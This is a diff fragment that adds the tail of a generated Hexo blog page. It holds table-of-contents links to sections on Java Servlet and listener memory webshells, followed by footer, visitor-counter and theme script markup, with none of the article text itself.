nav-level-3"><a class="nav-link" href="#Servlet%E5%88%9B%E5%BB%BA%E6%B5%81%E7%A8%8B"><span class="nav-text">Servlet创建流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99"><span class="nav-text">Servlet内存马编写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">listener型内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Listener%E5%9F%BA%E7%A1%80%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E4%BB%A5%E5%8F%8A%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">Listener基础代码实现以及流程分析</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">stoocea</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
